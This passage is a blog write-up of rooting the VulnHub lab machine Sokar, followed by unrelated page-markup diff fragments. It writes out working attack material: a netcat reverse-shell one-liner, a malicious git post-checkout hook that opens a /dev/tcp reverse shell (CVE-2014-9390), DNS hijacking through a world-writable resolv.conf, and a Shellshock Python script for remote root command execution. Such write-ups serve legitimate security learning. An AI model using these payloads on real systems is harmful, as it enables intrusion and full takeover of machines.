/lib/x86_64-linux-gnu/ld-2.13.so 2b53e6d04000-2b53e6d05000 rwxp 00000000 00:00 0 2b53e6d05000-2b53e6e87000 r-xp 00000000 fe:00 534538 /lib/x86_64-linux-gnu/libc-2.13.so 2b53e6e87000-2b53e7087000 ---p 00182000 fe:00 534538 /lib/x86_64-linux-gnu/libc-2.13.so 2b53e7087000-2b53e708b000 r-xp 00182000 fe:00 534538 /lib/x86_64-linux-gnu/libc-2.13.so 2b53e708b000-2b53e708c000 rwxp 00186000 fe:00 534538 /lib/x86_64-linux-gnu/libc-2.13.so 2b53e708c000-2b53e7091000 rwxp 00000000 00:00 0 2b53e7091000-2b53e70a6000 r-xp 00000000 fe:00 523276 /lib/x86_64-linux-gnu/libgcc_s.so.1 2b53e70a6000-2b53e72a6000 ---p 00015000 fe:00 523276 /lib/x86_64-linux-gnu/libgcc_s.so.1 2b53e72a6000-2b53e72a7000 rwxp 00015000 fe:00 523276 /lib/x86_64-linux-gnu/libgcc_s.so.1 2b53e886b000-2b53e888c000 rwxp 00000000 00:00 0 [heap] 7fff340b7000-7fff340d8000 rwxp 00000000 00:00 0 [stack] 7fff341eb000-7fff341ed000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] [1] 18571 abort ./build I slapped build into gdb to take a closer look at the potential overflow as well as the security features that build has been compiled with:\nleonjza@kali/sokar $ gdb -q ./build Reading symbols from /root/sokar/build...(no debugging symbols found)...done. gdb-peda$ checksec CANARY : ENABLED FORTIFY : ENABLED NX : disabled PIE : ENABLED RELRO : disabled :O The CANARY explains the failure in __fortify_fail. Disassembly of the main function reveals a call to __gets_chk which is responsible for the canary validation:\ngdb-peda$ disass main Dump of assembler code for function main: [... snip ...] 0x00000000000009cc : mov esi,0x2 0x00000000000009d1 : mov rdi,rbx 0x00000000000009d4 : call 0x760  0x00000000000009d9 : lea rsi,[rbp-0x30] 0x00000000000009dd : mov rdi,rbx 0x00000000000009e0 : call 0x790  0x00000000000009e5 : test eax,eax [... snip ...] It is possible that the original source was using gets() without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.\nI fiddled around a little more with the binary, and inspected the call to encryptDecrypt:\ngdb-peda$ disass encryptDecrypt Dump of assembler code for function encryptDecrypt: 0x00000000000008ac : mov rdx,rdi 0x00000000000008af : mov r9d,0x0 0x00000000000008b5 : mov r11,0xffffffffffffffff 0x00000000000008bc : mov r10,rdi 0x00000000000008bf : mov eax,0x0 0x00000000000008c4 : jmp 0x8d6  0x00000000000008c6 : movzx ecx,BYTE PTR [rdx+r8*1] 0x00000000000008cb : xor ecx,0x49 0x00000000000008ce : mov BYTE PTR [rsi+r8*1],cl 0x00000000000008d2 : add r9d,0x1 0x00000000000008d6 : movsxd r8,r9d 0x00000000000008d9 : mov rcx,r11 0x00000000000008dc : mov rdi,r10 0x00000000000008df : repnz scas al,BYTE PTR es:[rdi] 0x00000000000008e1 : not rcx 0x00000000000008e4 : sub rcx,0x1 0x00000000000008e8 : cmp r8,rcx 0x00000000000008eb : jb 0x8c6  0x00000000000008ed : repz ret End of assembler dump. This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with I as the key over a string.\nvoid encryptDecrypt(int arg0, int arg1) { rsi = arg1; rdx = arg0; LODWORD(r9) = 0x0; r10 = arg0; do { r8 = sign_extend_64(LODWORD(r9)); asm{ repne scasb }; if (r8 = !0xffffffffffffffff - 0x1) { break; } *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) \u0026 0xff) ^ 0x49); LODWORD(r9) = LODWORD(r9) + 0x1; } while (true); return; } Running the binary in gdb and setting a breakpoint before the system() call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted and decrypted versions of the string to be executed.\nsokar # gdb -q ./build gdb-peda$ r Build? (Y/N) n OK :( [Inferior 1 (process 4450) exited with code 06] Warning: not running or target is remote gdb-peda$ b *0x0000555555554a38 Breakpoint 1 at 0x555555554a38 gdb-peda$ r Build? (Y/N) Y [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x7fffffffe740 (\"/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/\") RCX: 0x7ffff7b26e99 (: cmp rax,0xfffffffffffff000) RDX: 0x7fffffffe7a0 (\"f$'=f:,*;,=d9;\u0026#,*=f\") RSI: 0x0 RDI: 0x7fffffffe740 (\"/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/\") RBP: 0x7fffffffe830 -- 0x0 RSP: 0x7fffffffe740 (\"/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/\") RIP: 0x555555554a38 (: mov eax,0x0) R8 : 0x51 ('Q') R9 : 0x51 ('Q') R10: 0x0 R11: 0x246 R12: 0x7fffffffe7a0 (\"f$'=f:,*;,=d9;\u0026#,*=f\") R13: 0x7fffffffe910 -- 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x555555554a2b : mov eax,0x0 0x555555554a30 : call 0x5555555547a0  0x555555554a35 : mov rdi,rbx = 0x555555554a38 : mov eax,0x0 0x555555554a3d : call 0x555555554750  0x555555554a42 : mov rsp,r12 0x555555554a45 : jmp 0x555555554a5d  0x555555554a47 : lea rsi,[rip+0x12c] # 0x555555554b7a [------------------------------------stack-------------------------------------] 0000| 0x7fffffffe740 (\"/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/\") 0008| 0x7fffffffe748 (\"/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/\") 0016| 0x7fffffffe750 (\"ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/\") 0024| 0x7fffffffe758 (\"/root@sokar-dev:/root/secret-project /mnt/secret-project/\") 0032| 0x7fffffffe760 (\"kar-dev:/root/secret-project /mnt/secret-project/\") 0040| 0x7fffffffe768 (\"/root/secret-project /mnt/secret-project/\") 0048| 0x7fffffffe770 (\"cret-project /mnt/secret-project/\") 0056| 0x7fffffffe778 (\"ject /mnt/secret-project/\") [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x0000555555554a38 in main () gdb-peda$ x/x $rbx 0x7fffffffe740: 0x2f gdb-peda$ x/s $rbx 0x7fffffffe740: \"/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/\" gdb-peda$ x/s $rdx 0x7fffffffe7a0: \"f$'=f:,*;,=d9;\u0026#,*=f\" gdb-peda$ Right before this call though, there is a instruction to call 0x5555555547a0  to set the UID to 0. So, this brought me to the conclusion that build is running /usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/ as root. But what is so special about this?\ninspecting git I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a git clone as root? One of my first theories was that if I could get sokar-dev to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions git will honor really is the symlink and executable bits :(\nFurther enumeration while I was thinking about the possibilities revealed that /mnt/ was actually mounted with the vfat filesystem!\nleonjza@kali/sokar $ python apophis.py \"mount; cat /etc/fstab\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','mount; cat /etc/fstab', 'apophis']);\" Password: /dev/sda1 on / type ext4 (rw) proc on /proc type proc (rw) sysfs on /sys type sysfs (rw) devpts on /dev/pts type devpts (rw,gid=5,mode=620) tmpfs on /dev/shm type tmpfs (rw) /dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502) none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) # # /etc/fstab # Created by anaconda on Wed Nov 12 13:29:15 2014 # # Accessible filesystems, by reference, are maintained under '/dev/disk' # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # UUID=cdb3ac23-d831-4104-bc76-e3a56314b6e4 / ext4 defaults 1 1 tmpfs /dev/shm tmpfs defaults 0 0 devpts /dev/pts devpts gid=5,mode=620 0 0 sysfs /sys sysfs defaults 0 0 proc /proc proc defaults 0 0 /dev/sdb1 /mnt vfat defaults,uid=501,gid=502 0 0 As you can see, /mnt also specified the uid/gid for files on the mount, so even if I were able to get a suid shell onto the file system, root will not be the one owning it.\nHowever. vfat. Why vfat… Of course! CVE-2014-9390. The potential client side code execution bug in older git versions where a case insensitive filesystem may cause the git client to read hooks from .Git/hooks instead of .git/hooks. And, of course, vfat is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.\nI checked up on the installed version of git on Sokar, just to make sure that it is in fact vulnerable:\nleonjza@kali/sokar $ python apophis.py \"git --version\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','git --version', 'apophis']);\" Password: git version 2.2.0 Great. git version 2.2.1 fixed this bug so we are in luck.\nrooting sokar All of this information was great to have, but it still had one major problem. How can I clone a repository I own? I made countless attempts to try fool the environment into resolving sokar-dev to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process ‘cleans up’ the environment, especially for reasons such as this one.\nI started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:\nleonjza@kali/sokar $ python apophis.py \"find /etc/ -writable -type f 2/dev/null | xargs ls -lh\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','find /etc/ -writable -type f 2/dev/null | xargs ls -lh', 'apophis']);\" Password: -rw-rw-rw- 1 root root 19 Jan 2 20:12 /etc/resolv.conf /etc/resolv.conf is world writable. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D\npreparing the environment and exploit I decided to use dnsmasq for a quick to setup DNS server. I added a line to /etc/dnsmasq.hosts to answer a query for sokar-dev:\nleonjza@kali/sokar $ cat /etc/dnsmasq.hosts 192.168.217.174 sokar-dev … and started the dnsmasq server:\nleonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts dnsmasq: started, version 2.62 cachesize 150 dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack dnsmasq: reading /etc/resolv.conf dnsmasq: using nameserver 192.168.252.2#53 dnsmasq: read /etc/hosts - 6 addresses dnsmasq: read /etc/dnsmasq.hosts - 1 addresses Testing my DNS server proved that it was working just fine:\nleonjza@kali/sokar $ dig sokar-dev @127.0.0.1 ;  DiG 9.8.4-rpz2+rl005.12-P1  sokar-dev @127.0.0.1 ;; global options: +cmd ;; Got answer: ;; -HEADERde: QUERY, status: NOERROR, id: 48044 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;sokar-dev. IN A ;; ANSWER SECTION: sokar-dev. 0 IN A 192.168.217.174 ;; Query time: 13 msec ;; SERVER: 127.0.0.1#53(127.0.0.1) ;; WHEN: Tue Feb 3 12:12:02 2015 ;; MSG SIZE rcvd: 43 Awesome. The next step was to replace the contents of Sokar’s /etc/resolv.conf so that the dns server to use is 192.168.217.174 with the command python apophis.py \"echo \\\"nameserver\\ 192.168.217.174\\\"  /etc/resolv.conf\" and confirm that it worked:\nleonjza@kali/sokar $ python apophis.py \"cat /etc/resolv.conf\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','cat /etc/resolv.conf', 'apophis']);\" Password: nameserver 192.168.217.174 Great. Testing time!\nleonjza@kali/sokar $ python apophis.py \"echo Y | /home/apophis/build\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','echo Y | /home/apophis/build', 'apophis']);\" Password: Cloning into '/mnt/secret-project'... Host key verification failed. fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. Build? (Y/N) Yesssssss, and nooooooooo. From the dnsmasq console output I could see the request for sokar-dev coming in and a reply getting sent:\ndnsmasq: query[A] sokar-dev from 192.168.217.163 dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174 However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type ‘yes’. I can not use ssh-keyscan  ~/.ssh/known_hosts as I can’t write to root’s .ssh directory, nor can I modify the command that is being passed onto system() in the binary to specify -o StrictHostKeyChecking=no.\nUnfortunately, due to these restrictions, I had to finally give in and go one step back to bynarr.py and use his allowed egress access on tcp/51242 to build a interactive shell. On one session I started a netcat listener, and on another, I ran python bynarr.py \"/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u00261|nc 192.168.217.174 51242 /tmp/f\".\nleonjza@kali/sokar $ nc -lvp 51242 listening on [any] 51242 ... 192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] 40382 sh: no job control in this shell sh-4.1$ python -c 'import pty;pty.spawn(\"/bin/bash\")' python -c 'import pty;pty.spawn(\"/bin/bash\")' [bynarr@sokar cgi-bin]$ su - apophis su - apophis Password: overdrive [apophis@sokar ~]$ id id uid=501(apophis) gid=502(apophis) groups=502(apophis) [apophis@sokar ~]$ With the interactive shell as apophis now, I was able to accept the SSH hostkey check.\nThe next thing left on the list was to prepare a git repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for /root/secret-project, I prepared just that on my Kali VM:\nleonjza@kali/sokar $ cd /root leonjza@kali/root $ mkdir secret-project leonjza@kali/root $ cd secret-project leonjza@kali/root/secret-project $ git init --bare Initialized empty Git repository in /root/secret-project/ leonjza@kali/root/secret-project | git:master $ Thats it… Next, I cloned it locally in a different folder.\nleonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project Cloning into 'secret-project'... root@127.0.0.1's password: warning: You appear to have cloned an empty repository. leonjza@kali/sokar $ cd secret-project leonjza@kali/sokar/secret-project | git:master $ Done. Working from a PoC exploit found here, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM’s) on a tcp/22 netcat listener, spawning a shell. I knew tcp/22 traffic was allowed due to the SSH host key verification step that needed some work :)\nleonjza@kali/sokar/secret-project | git:master $ mkdir .Git leonjza@kali/sokar/secret-project | git:master $ cd .Git leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout #!/bin/sh bash -i \u0026 /dev/tcp/192.168.217.1/22 0\u00261 leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m 'pwnd' [master (root-commit) ee364fd] pwnd Committer: root  1 file changed, 2 insertions(+) create mode 100755 .Git/hooks/post-checkout leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master root@127.0.0.1's password: Counting objects: 5, done. Compressing objects: 100% (2/2), done. Writing objects: 100% (5/5), 345 bytes, done. Total 5 (delta 0), reused 0 (delta 0) To ssh://127.0.0.1/root/secret-project * [new branch] master - master Branch master set up to track remote branch master from origin. leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ With my evil repository ready, it was time to try that build again :)\n[apophis@sokar ~]$ ./build ./build Build? (Y/N) Y Y Cloning into '/mnt/secret-project'... root@sokar-dev's password: # redact lol remote: Counting objects: 5, done. remote: Compressing objects: 100% (2/2), done. Receiving objects: 100% (5/5), done. remote: Total 5 (delta 0), reused 0 (delta 0) Checking connectivity... done. This shell just ‘hung’ there, however, the netcat listener on my Mac had a different story to tell:\nleonjza@laptop » sudo nc -lv 22 Password: [root@sokar secret-project]# cat /root/flag cat /root/flag 0 0 | | ____|___|____ 0 |~ ~ ~ ~ ~ ~| 0 | | Happy | | ___|__|___________|___|__ |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/| 0 | B i r t h d a y | 0 | |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/| | _|___|_______________________|___|__ |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/| | | | V u l n H u b ! ! | | ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ | |___________________________________| ===================================== | Congratulations on beating Sokar! | | | | Massive shoutout to g0tmi1k and | | the entire community which makes | | VulnHub possible! | | | | rasta_mouse (@_RastaMouse) | ===================================== [root@sokar secret-project]# conclusion What a blast! Them feels of r00t are so gooood. For the curios, that firewall that was making life so difficult:\n[root@sokar secret-project]# cat /etc/sysconfig/iptables cat /etc/sysconfig/iptables # Firewall configuration written by system-config-firewall # Manual customization of this file is not recommended. *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT -A INPUT -p icmp -j DROP -A INPUT -i lo -j ACCEPT -A INPUT -m state --state ESTABLISHED -p tcp --sport 22 -j ACCEPT -A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT -A INPUT -p udp --sport 53 -j ACCEPT -A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner 0 -p tcp --dport 22 -j ACCEPT -A OUTPUT -p udp --dport 53 -m owner --uid-owner 0 -j ACCEPT -A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT -A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT -A OUTPUT -j DROP COMMIT edit I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the lime script run with sudo can be shocked too!\n#!/usr/bin/python # 2015 Leon Jacobs # sokar remote root command execution import requests import sys if len(sys.argv)  2: print \" * Usage %s\" % sys.argv[0] sys.exit(1) # Grab the command from the args command = sys.argv[1].strip() # prep to shock the lime script root_command = \"\"\"echo \"N\" | sudo MAIL=\\\\\"() { :;}; %s;\\\\\" /home/bynarr/lime\"\"\" % command # prep to exec the command as bynarr payload = \"\"\"/usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','%s', 'bynarr']);\" \"\"\" % root_command # be verbose about the full command print \" * Executing %s\\n\" % payload # Send the sploit headers = { \"User-Agent\": \"() { :;};echo;%s\" % payload } print requests.get(\"http://192.168.217.163:591/cgi-bin/cat\", headers=headers).text.strip() Run with python root.py \"/bin/cat /root/flag\" :D\nThanks to @_RastaMouse for the VM, and as always, @VulnHub for the hosting and great community!\n","wordCount":"6474","inLanguage":"en","datePublished":"2015-02-21T15:55:03Z","dateModified":"2015-02-21T15:55:03Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
 </head>
-<body class=dark-theme>
-<div class=container>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
 <header class=header>
-<span class=header__inner>
-<a href=/ class=logo style=text-decoration:none>
-<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
-</span>
-<span class=logo__text>#!/bin/note
-</span>
-<span class=logo__cursor></span>
+<nav class=nav>
+<div class=logo>
+<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
+ (Alt + H)">#!/bin/note
 </a>
-<span class=header__right>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://leonjza.github.io/about/ title="About Me">
+<span>About Me</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/archives title=Archive>
+<span>Archive</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/categories title=Categories>
+<span>Categories</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
 </ul>
 </nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
-</span>
-</span>
-</span>
 </header>
-<div class=content>
-<div class=post>
-<h1 class=post-title>beating sokar the vulnhub turns 0b10 challenge</h1>
-<div class=post-meta>
-<span class=post-date>
-2015-02-21
-</span>
-<span class=post-read-time>— 31 min read</span>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
+<h1 class=post-title>
+beating sokar the vulnhub turns 0b10 challenge
+</h1>
+<div class=post-meta>February 21, 2015&nbsp;·&nbsp;31 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2015-02-21-beating-sokar-the-vulnhub-turns-0b10-challenge.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
 </div>
-<div class=post-content>
-<h2>Table of Contents</h2>
-<aside class=table-of-contents><nav id=TableOfContents>
-<ul>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
 <li>
-<ul>
-<li><a href=#introduction>introduction</a></li>
-<li><a href=#a-usual-start>a usual start</a></li>
-<li><a href=#cgi-bincat>/cgi-bin/cat</a></li>
-<li><a href=#making-life-easier>making life easier</a></li>
-<li><a href=#egress-firewalls-le-suck>egress firewalls le-suck</a></li>
-<li><a href=#bynarr-the-fruit>bynarr the fruit</a></li>
-<li><a href=#the-scary-linux-memory-extractor>the scary linux memory extractor</a></li>
-<li><a href=#build-the-clone-to-the-hook>build the clone to the hook</a>
-<ul>
-<li><a href=#the-impossible-b0f>the impossible b0f</a></li>
-<li><a href=#inspecting-git>inspecting git</a></li>
-</ul>
+<a href=#introduction aria-label=introduction>introduction</a></li>
+<li>
+<a href=#a-usual-start aria-label="a usual start">a usual start</a></li>
+<li>
+<a href=#cgi-bincat aria-label=/cgi-bin/cat>/cgi-bin/cat</a></li>
+<li>
+<a href=#making-life-easier aria-label="making life easier">making life easier</a></li>
+<li>
+<a href=#egress-firewalls-le-suck aria-label="egress firewalls le-suck">egress firewalls le-suck</a></li>
+<li>
+<a href=#bynarr-the-fruit aria-label="bynarr the fruit">bynarr the fruit</a></li>
+<li>
+<a href=#the-scary-linux-memory-extractor aria-label="the scary linux memory extractor">the scary linux memory extractor</a></li>
+<li>
+<a href=#build-the-clone-to-the-hook aria-label="build the clone to the hook">build the clone to the hook</a><ul>
+<li>
+<a href=#the-impossible-b0f aria-label="the impossible b0f">the impossible b0f</a></li>
+<li>
+<a href=#inspecting-git aria-label="inspecting git">inspecting git</a></li></ul>
 </li>
-<li><a href=#rooting-sokar>rooting sokar</a>
-<ul>
-<li><a href=#preparing-the-environment-and-exploit>preparing the environment and exploit</a></li>
-</ul>
+<li>
+<a href=#rooting-sokar aria-label="rooting sokar">rooting sokar</a><ul>
+<li>
+<a href=#preparing-the-environment-and-exploit aria-label="preparing the environment and exploit">preparing the environment and exploit</a></li></ul>
 </li>
-<li><a href=#conclusion>conclusion</a></li>
-<li><a href=#edit>edit</a></li>
-</ul>
+<li>
+<a href=#conclusion aria-label=conclusion>conclusion</a></li>
+<li>
+<a href=#edit aria-label=edit>edit</a>
 </li>
 </ul>
-</nav></aside>
-<h2 id=introduction>introduction</h2>
+</div>
+</details>
+</div>
+<div class=post-content><h2 id=introduction>introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
 <p><a href=http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html>Vulnhub is 0b10</a> years old. That is binary for 2 :) In order to celebrate this, <a href=https://twitter.com/_RastaMouse>@_RastaMouse</a>
 created <a href=https://www.vulnhub.com/entry/sokar-1,113/>Sokar</a>.</p>
-<figure class=left>
-<img src=/images/sokar_logo.png>
+<figure>
+<img loading=lazy src=/images/sokar_logo.png>
 </figure>
 <p>Sokar was used as another writeup competition (the first for 2015), similar to the <a href=https://leonjza.github.io/blog/2014/09/18/from-persistence/>Persistence</a> challenge from Sep &lsquo;14.
 From the <a href=http://blog.vulnhub.com/2015/01/competition-sokar.html>competition announcement blogpost</a>, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
 Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.</p>
 <p>Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!</p>
 <p>Here is my entry for the competition. Enjoy! :)</p>
-<h2 id=a-usual-start>a usual start</h2>
+<h2 id=a-usual-start>a usual start<a hidden class=anchor aria-hidden=true href=#a-usual-start>#</a></h2>
 <p>You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire <code>nmap</code> at it. I followed exactly these steps apart from using the usual <code>netdiscover</code> to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.</p>
 <p>I knew which interface the network was bound to on my Mac, so I started the sniffer with <code>sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@laptop » sudo /Applications/VMware<span style=color:#ae81ff>\ </span>Fusion.app/Contents/Library/vmnet-sniffer vmnet1
@@ -168,10 +190,10 @@ MAC Address: 08:00:27:F2:40:DB <span style=color:#f92672>(</span>Cadmus Computer
 
 Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 1133.72 seconds
 </code></pre></div><p>One port open on tcp. <code>tcp/591</code>.</p>
-<h2 id=cgi-bincat>/cgi-bin/cat</h2>
+<h2 id=cgi-bincat>/cgi-bin/cat<a hidden class=anchor aria-hidden=true href=#cgi-bincat>#</a></h2>
 <p>The service on <code>tcp/591</code> appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML <code>&lt;iframe></code> to http://192.168.217.163:591/cgi-bin/cat. Requesting this page alone was the same stats, minus that creepy pink color ;)</p>
-<figure class=left>
-<img src=/images/sokar_cat.png>
+<figure>
+<img loading=lazy src=/images/sokar_cat.png>
 </figure>
 <p>I toyed around quite a bit with this webserver. The textbook approach of running <code>wfuzz</code> to discover some web paths, <code>nikto</code> to discover some interesting information etc. was used. Alas, none of these tools proved really useful.</p>
